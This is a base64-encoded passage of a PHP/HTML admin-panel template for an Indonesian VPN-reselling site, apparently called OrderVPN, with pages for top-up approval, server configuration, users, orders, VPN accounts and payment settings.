YWNoKCRhbGxUb3B1cHMgYXMgJHQpOj8+CiAgICAgICAgICA8dHI+CiAgICAgICAgICAgIDx0ZD48Pz1odG1sc3BlY2lhbGNoYXJzKCR0Wyd1c2VybmFtZSddKT8+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LXdlaWdodDo3MDAiPjw/PWZvcm1hdFJ1cGlhaCgkdFsnYW1vdW50J10pPz48L3RkPgogICAgICAgICAgICA8dGQ+PD89aHRtbHNwZWNpYWxjaGFycygkdFsncGF5bWVudF9tZXRob2QnXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0iYmFkZ2UgYi08Pz0kdFsnc3RhdHVzJ10/PiI+PD89JHRbJ3N0YXR1cyddPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkPjw/PWRhdGUoJ2QgTSBZIEg6aScsc3RydG90aW1lKCR0WydjcmVhdGVkX2F0J10pKT8+PC90ZD4KICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgIDw/cGhwIGlmKCR0WydzdGF0dXMnXT09PSdwZW5kaW5nJyk6Pz4KICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIHN0eWxlPSJkaXNwbGF5OmlubGluZSI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iYXBwcm92ZV90b3B1cCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9wdXBfaWQiIHZhbHVlPSI8Pz0kdFsnaWQnXT8+Ij48YnV0dG9uIGNsYXNzPSJidG4gYnRuLWdyZWVuIj7inIU8L2J1dHRvbj48L2Zvcm0+CiAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTppbmxpbmUiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InJlamVjdF90b3B1cCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9wdXBfaWQiIHZhbHVlPSI8Pz0kdFsnaWQnXT8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJub3RlIiB2YWx1ZT0iRGl0b2xhayI+PGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1yZWQiPuKdjDwvYnV0dG9uPjwvZm9ybT4KICAgICAgICAgICAgICA8P3BocCBlbmRpZjs/PgogICAgICAgICAgICAgIDw/cGhwIGlmKCR0WydidWt0aV90cmFuc2ZlciddKTo/PjxhIGhyZWY9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ2J1a3RpX3RyYW5zZmVyJ10pPz4iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lIj7wn5a8PC9hPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDs/PgogICAgICAgICAgPC90Ym9keT4KICAgICAgICA8L3RhYmxlPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIFNFUlZFUlMgLS0+CiAgPGRpdiBjbGFzcz0icGFnZSIgaWQ9InRhYi1zZXJ2ZXJzIj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+8J+MkCBEYWZ0YXIgU2VydmVyPC9kaXY+PGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWRkU2VydmVyRm9ybScpLnN0eWxlLmRpc3BsYXk9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FkZFNlcnZlckZvcm0nKS5zdHlsZS5kaXNwbGF5PT09J25vbmUnPydibG9jayc6J25vbmUnIj4rIFRhbWJhaCBTZXJ2ZXI8L2J1dHRvbj48L2Rpdj4KICAgICAgPGRpdiBpZD0iYWRkU2VydmVyRm9ybSIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwYWRkaW5nOjEuMjVyZW07Ym9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTtiYWNrZ3JvdW5kOnZhcigtLWNhcmQyKSI+CiAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9ImFkZF9zZXJ2ZXIiPgogICAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDIiPgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5OYW1hIFNlcnZlcjwvbGFiZWw+PGlucHV0IG5hbWU9Im5hbWFfc2VydmVyIiBwbGFjZWhvbGRlcj0iQklaTkVUIElEQyIgcmVxdWlyZWQ+PC9kaXY+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPktvZGUgU2VydmVyPC9sYWJlbD48aW5wdXQgbmFtZT0iY29kZV9zZXJ2ZXIiIHBsYWNlaG9sZGVyPSJzZ3AxIiByZXF1aXJlZD48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+TG9rYXNpPC9sYWJlbD48aW5wdXQgbmFtZT0ibG9rYXNpIiBwbGFjZWhvbGRlcj0iU2luZ2FwdXJhIiByZXF1aXJlZD48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+RmxhZyBFbW9qaTwvbGFiZWw+PGlucHV0IG5hbWU9ImZsYWciIHBsYWNlaG9sZGVyPSLwn4e48J+HrCIgdmFsdWU9IvCfh67wn4epIj48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+SVAvSG9zdCBWUFM8L2xhYmVsPjxpbnB1dCBuYW1lPSJob3N0IiBwbGFjZWhvbGRlcj0iMTAzLngueC54IiByZXF1aXJlZD48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+UG9ydCBTU0g8L2xhYmVsPjxpbnB1dCBuYW1lPSJwb3J0IiB0eXBlPSJudW1iZXIiIHZhbHVlPSIyMiI+PC9kaXY+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPlNTSCBVc2VyPC9sYWJlbD48aW5wdXQgbmFtZT0ic3NoX3VzZXIiIHZhbHVlPSJyb290Ij48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+U1NIIFBhc3N3b3JkIChvcHNpb25hbCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJzc2hfcGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iSmlrYSB0aWRhayBwYWthaSBrZXkiPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5QYXRoIFNTSCBLZXkgKG9wc2lvbmFsKTwvbGFiZWw+PGlucHV0IG5hbWU9InNzaF9rZXkiIHBsYWNlaG9sZGVyPSIvcm9vdC8uc3NoL2lkX3JzYSI+PC9kaXY+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPkRvbWFpbiBWUFM8L2xhYmVsPjxpbnB1dCBuYW1lPSJkb21haW4iIHBsYWNlaG9sZGVyPSJkb21haW4uY29tIChvcHNpb25hbCkiPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5IYXJnYS9IYXJpIChScCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJoYXJnYV9oYXJpIiB0eXBlPSJudW1iZXIiIHZhbHVlPSIzMDAiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5IYXJnYS9CdWxhbiAoUnApPC9sYWJlbD48aW5wdXQgbmFtZT0iaGFyZ2FfYnVsYW4iIHR5cGU9Im51bWJlciIgdmFsdWU9IjkwMDAiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luLWJvdHRvbTouNzVyZW0iPuKaoO+4jyBQYXN0aWthbiA8Y29kZT52cG4tYXBpPC9jb2RlPiBzdWRhaCB0ZXJwYXNhbmcgZGkgVlBTIHRhcmdldCBkZW5nYW4gPGNvZGU+aW5zdGFsbC1vcmRlcnZwbi5zaDwvY29kZT48L3A+CiAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+8J+SviBTaW1wYW4gU2VydmVyPC9idXR0b24+CiAgICAgICAgPC9mb3JtPgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IG92ZXJmbG93LXgiPgogICAgICAgIDx0YWJsZT4KICAgICAgICAgIDx0aGVhZD48dHI+PHRoPlNlcnZlcjwvdGg+PHRoPkhvc3Q8L3RoPjx0aD5Mb2thc2k8L3RoPjx0aD5IYXJnYS9IYXJpPC90aD48dGg+U3RhdHVzPC90aD48dGg+QWtzaTwvdGg+PC90cj48L3RoZWFkPgogICAgICAgICAgPHRib2R5PgogICAgICAgICAgPD9waHAgZm9yZWFjaCgkc2VydmVycyBhcyAkcyk6Pz4KICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkPjxzdHJvbmc+PD89aHRtbHNwZWNpYWxjaGFycygkc1snbmFtYV9zZXJ2ZXInXSk/Pjwvc3Ryb25nPjxicj48c3BhbiBzdHlsZT0iY29sb3I6dmFyKC0tbXV0ZWQpO2ZvbnQtc2l6ZTouNzJyZW0iPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ2NvZGVfc2VydmVyJ10pPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LWZhbWlseTptb25vc3BhY2U7Zm9udC1zaXplOi43OHJlbSI+PD89aHRtbHNwZWNpYWxjaGFycygkc1snaG9zdCddKT8+PC90ZD4KICAgICAgICAgICAgPHRkPjw/PSRzWydmbGFnJ10/Pyfwn4eu8J+HqSc/PiA8Pz1odG1sc3BlY2lhbGNoYXJzKCRzWydsb2thc2knXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48Pz1mb3JtYXRSdXBpYWgoJHNbJ2hhcmdhX2hhcmknXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0iYmFkZ2UgYi08Pz0kc1snc3RhdHVzJ10/PiI+PD89JHNbJ3N0YXR1cyddPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOi4zNXJlbTtmbGV4LXdyYXA6d3JhcCI+CiAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTppbmxpbmUiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0idG9nZ2xlX3NlcnZlciI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzZXJ2ZXJfaWQiIHZhbHVlPSI8Pz0kc1snaWQnXT8+Ij4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InN0YXR1cyIgdmFsdWU9Ijw/PSRzWydzdGF0dXMnXT09PSdyZWFkeSc/J21haW50ZW5hbmNlJzoncmVhZHknPz4iPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi15ZWxsb3ciPjw/PSRzWydzdGF0dXMnXT09PSdyZWFkeSc/J+KPuCBNTlQnOifilrYgT04nPz48L2J1dHRvbj4KICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTppbmxpbmUiIG9uc3VibWl0PSJyZXR1cm4gY29uZmlybSgnSGFwdXMgc2VydmVyIGluaT8nKSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJkZWxldGVfc2VydmVyIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNlcnZlcl9pZCIgdmFsdWU9Ijw/PSRzWydpZCddPz4iPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1yZWQiPvCfl5E8L2J1dHRvbj4KICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDs/PgogICAgICAgICAgPC90Ym9keT4KICAgICAgICA8L3RhYmxlPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIFVTRVJTIC0tPgogIDxkaXYgY2xhc3M9InBhZ2UiIGlkPSJ0YWItdXNlcnMiPgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7wn5GlIERhZnRhciBVc2VyICg8Pz1jb3VudCgkdXNlcnMpPz4pPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBvdmVyZmxvdy14Ij4KICAgICAgICA8dGFibGU+CiAgICAgICAgICA8dGhlYWQ+PHRyPjx0aD5Vc2VybmFtZTwvdGg+PHRoPkVtYWlsPC90aD48dGg+U2FsZG88L3RoPjx0aD5WZXJpZmllZDwvdGg+PHRoPlJvbGU8L3RoPjx0aD5EYWZ0YXI8L3RoPjx0aD5Ba3NpPC90aD48L3RyPjwvdGhlYWQ+CiAgICAgICAgICA8dGJvZHk+CiAgICAgICAgICA8P3BocCBmb3JlYWNoKCR1c2VycyBhcyAkdSk6Pz4KICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkPjxzdHJvbmc+PD89aHRtbHNwZWNpYWxjaGFycygkdVsndXNlcm5hbWUnXSk/Pjwvc3Ryb25nPjwvdGQ+CiAgICAgICAgICAgIDx0ZD48Pz1odG1sc3BlY2lhbGNoYXJzKCR1WydlbWFpbCddKT8+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJjb2xvcjp2YXIoLS1ncmVlbik7Zm9udC13ZWlnaHQ6NjAwIj48Pz1mb3JtYXRSdXBpYWgoJHVbJ3NhbGRvJ10pPz48L3RkPgogICAgICAgICAgICA8dGQ+PD89JHVbJ2lzX3ZlcmlmaWVkJ10/J+KchSc6J+KPsyc/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0iYmFkZ2UiIHN0eWxlPSI8Pz0kdVsncm9sZSddPT09J2FkbWluJz8nYmFja2dyb3VuZDojNGMxZDk1MjI7Y29sb3I6I2E3OGJmYSc6J2JhY2tncm91bmQ6IzBhMTYyODtjb2xvcjp2YXIoLS1tdXRlZCknIj48Pz0kdVsncm9sZSddPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LXNpemU6Ljc1cmVtIj48Pz1kYXRlKCdkIE0gWScsc3RydG90aW1lKCR1WydjcmVhdGVkX2F0J10pKT8+PC90ZD4KICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgIDw/cGhwIGlmKCR1Wydyb2xlJ10hPT0nYWRtaW4nKTo/PgogICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIiBvbnN1Ym1pdD0icmV0dXJuIGNvbmZpcm0oJ0hhcHVzIHVzZXIgPD89aHRtbHNwZWNpYWxjaGFycygkdVsndXNlcm5hbWUnXSk/Pj8nKSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJkZWxldGVfdXNlciI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1c2VyX2lkIiB2YWx1ZT0iPD89JHVbJ2lkJ10/PiI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXJlZCBidG4tc20iPvCfl5E8L2J1dHRvbj4KICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgPD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgPC90ZD4KICAgICAgICAgIDwvdHI+CiAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOz8+CiAgICAgICAgICA8L3Rib2R5PgogICAgICAgIDwvdGFibGU+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9kaXY+CgogIDwhLS0gT1JERVJTIC8gTEFQT1JBTiAtLT4KICA8ZGl2IGNsYXNzPSJwYWdlIiBpZD0idGFiLW9yZGVycyI+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPvCfm5IgTGFwb3JhbiBQZW1iZWxpYW48L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IG92ZXJmbG93LXgiPgogICAgICAgIDx0YWJsZT4KICAgICAgICAgIDx0aGVhZD48dHI+PHRoPlVzZXI8L3RoPjx0aD5LZXRlcmFuZ2FuPC90aD48dGg+Tm9taW5hbDwvdGg+PHRoPlN0YXR1czwvdGg+PHRoPlRhbmdnYWw8L3RoPjwvdHI+PC90aGVhZD4KICAgICAgICAgIDx0Ym9keT4KICAgICAgICAgIDw/cGhwIGZvcmVhY2goJG9yZGVycyBhcyAkbyk6Pz4KICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkPjw/PWh0bWxzcGVjaWFsY2hhcnMoJG9bJ3VzZXJuYW1lJ10pPz48L3RkPgogICAgICAgICAgICA8dGQ+PD89aHRtbHNwZWNpYWxjaGFycygkb1sna2V0ZXJhbmdhbiddPz8nJyk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZCBzdHlsZT0iZm9udC13ZWlnaHQ6NzAwO2NvbG9yOnZhcigtLWJsdWUpIj48Pz1mb3JtYXRSdXBpYWgoJG9bJ2Ftb3VudCddKT8+PC90ZD4KICAgICAgICAgICAgPHRkPjxzcGFuIGNsYXNzPSJiYWRnZSBiLTw/PSRvWydzdGF0dXMnXT8+Ij48Pz0kb1snc3RhdHVzJ10/Pjwvc3Bhbj48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW0iPjw/PWRhdGUoJ2QgTSBZIEg6aScsc3RydG90aW1lKCRvWydjcmVhdGVkX2F0J10pKT8+PC90ZD4KICAgICAgICAgIDwvdHI+CiAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOz8+CiAgICAgICAgICA8L3Rib2R5PgogICAgICAgIDwvdGFibGU+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9kaXY+CgogIDwhLS0gQUtVTiBWUE4gLS0+CiAgPGRpdiBjbGFzcz0icGFnZSIgaWQ9InRhYi1ha3VucyI+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPvCfk4sgU2VtdWEgQWt1biBWUE48L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IG92ZXJmbG93LXgiPgogICAgICAgIDx0YWJsZT4KICAgICAgICAgIDx0aGVhZD48dHI+PHRoPlVzZXI8L3RoPjx0aD5Vc2VybmFtZTwvdGg+PHRoPlRpcGU8L3RoPjx0aD5TZXJ2ZXI8L3RoPjx0aD5FeHBpcmVkPC90aD48dGg+U3RhdHVzPC90aD48L3RyPjwvdGhlYWQ+CiAgICAgICAgICA8dGJvZHk+CiAgICAgICAgICA8P3BocCBmb3JlYWNoKCRhbGxBa3VucyBhcyAkYSk6Pz4KICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkPjw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ3VuYW1lJ10pPz48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImZvbnQtZmFtaWx5Om1vbm9zcGFjZSI+PD89aHRtbHNwZWNpYWxjaGFycygkYVsndXNlcm5hbWUnXSk/Pjw/PSRhWydpc190cmlhbCddPycg8J+OgSc6Jyc/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0iYmFkZ2UgYi1hY3RpdmUiPjw/PXN0cnRvdXBwZXIoJGFbJ3RpcGUnXSk/Pjwvc3Bhbj48L3RkPgogICAgICAgICAgICA8dGQ+PD89aHRtbHNwZWNpYWxjaGFycygkYVsnbmFtYV9zZXJ2ZXInXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZCBzdHlsZT0iZm9udC1zaXplOi43NXJlbSI+PD89ZGF0ZSgnZCBNIFkgSDppJyxzdHJ0b3RpbWUoJGFbJ21hc2FfYWt0aWYnXSkpPz48L3RkPgogICAgICAgICAgICA8dGQ+PHNwYW4gY2xhc3M9ImJhZGdlIGItPD89JGFbJ3N0YXR1cyddPz4iPjw/PSRhWydzdGF0dXMnXT8+PC9zcGFuPjwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDs/PgogICAgICAgICAgPC90Ym9keT4KICAgICAgICA8L3RhYmxlPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIFNFVFRJTkdTIC0tPgogIDxkaXYgY2xhc3M9InBhZ2UiIGlkPSJ0YWItc2V0dGluZ3MiPgogICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InNhdmVfc2V0dGluZ3MiPgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7wn4yQIEluZm8gQXBsaWthc2k8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJncmlkMiI+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5OYW1hIEFwbGlrYXNpPC9sYWJlbD48aW5wdXQgbmFtZT0iYXBwX25hbWUiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ2FwcF9uYW1lJywnT3JkZXJWUE4nKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5Mb2dvIChFbW9qaSk8L2xhYmVsPjxpbnB1dCBuYW1lPSJhcHBfbG9nbyIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnYXBwX2xvZ28nLCfwn5O2JykpPz4iPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7wn5OeIEtvbnRhayBBZG1pbjwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgIDxkaXYgY2xhc3M9ImdyaWQzIj4KICAgICAgICAgIDxkaXY+PGxhYmVsPldoYXRzQXBwIChub21vcik8L2xhYmVsPjxpbnB1dCBuYW1lPSJjb250YWN0X3dhIiBwbGFjZWhvbGRlcj0iNjI4eHh4eHh4eHh4eCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnY29udGFjdF93YScpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPlRlbGVncmFtIChAdXNlcm5hbWUpPC9sYWJlbD48aW5wdXQgbmFtZT0iY29udGFjdF90ZyIgcGxhY2Vob2xkZXI9IkB1c2VybmFtZSIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnY29udGFjdF90ZycpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkluc3RhZ3JhbSAoQHVzZXJuYW1lKTwvbGFiZWw+PGlucHV0IG5hbWU9ImNvbnRhY3RfaWciIHBsYWNlaG9sZGVyPSJAdXNlcm5hbWUiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ2NvbnRhY3RfaWcnKSk/PiI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPvCfkrMgTWV0b2RlIFBlbWJheWFyYW4gTWFudWFsPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbi10aXRsZSI+8J+PpiBUcmFuc2ZlciBCYW5rPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDMiPgogICAgICAgICAgPGRpdj48bGFiZWw+TmFtYSBCYW5rPC9sYWJlbD48aW5wdXQgbmFtZT0iYmFua19uYW1lIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdiYW5rX25hbWUnLCdCQ0EnKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5Oby4gUmVrZW5pbmc8L2xhYmVsPjxpbnB1dCBuYW1lPSJiYW5rX2FjY291bnQiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ2JhbmtfYWNjb3VudCcpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkF0YXMgTmFtYTwvbGFiZWw+PGlucHV0IG5hbWU9ImJhbmtfaG9sZGVyIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdiYW5rX2hvbGRlcicpKT8+Ij48L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJzZWN0aW9uLXRpdGxlIj7wn5OxIEUtV2FsbGV0PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDMiPgogICAgICAgICAgPGRpdj48bGFiZWw+RGFuYSAobm9tb3IgSFApPC9sYWJlbD48aW5wdXQgbmFtZT0iZGFuYV9udW1iZXIiIHBsYWNlaG9sZGVyPSIwOHh4eHh4eHh4eHgiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ2RhbmFfbnVtYmVyJykpPz4iPjwvZGl2PgogICAgICAgICAgPGRpdj48bGFiZWw+R29QYXkgKG5vbW9yIEhQKTwvbGFiZWw+PGlucHV0IG5hbWU9ImdvcGF5X251bWJlciIgcGxhY2Vob2xkZXI9IjA4eHh4eHh4eHh4eCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnZ29wYXlfbnVtYmVyJykpPz4iPjwvZGl2PgogICAgICAgICAgPGRpdj48bGFiZWw+U2hvcGVlUGF5IChub21vciBIUCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJzaG9wZWVfbnVtYmVyIiBwbGFjZWhvbGRlcj0iMDh4eHh4eHh4eHh4IiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdzaG9wZWVfbnVtYmVyJykpPz4iPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNlY3Rpb24tdGl0bGUiPvCfk7cgUVJJUzwvZGl2PgogICAgICAgIDxkaXY+PGxhYmVsPlVwbG9hZCBHYW1iYXIgUVJJUzwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InFyaXNfaW1hZ2UiIGFjY2VwdD0iaW1hZ2UvKiIgc3R5bGU9Im1hcmdpbi1ib3R0b206LjVyZW0iPjwvZGl2PgogICAgICAgIDw/cGhwIGlmKGdldFNldHRpbmcoJ3FyaXNfaW1hZ2UnKSk6Pz48aW1nIHNyYz0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdxcmlzX2ltYWdlJykpPz4iIHN0eWxlPSJtYXgtd2lkdGg6MTUwcHg7Ym9yZGVyLXJhZGl1czo4cHg7bWFyZ2luLWJvdHRvbTouNzVyZW0iPjw/cGhwIGVuZGlmOz8+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc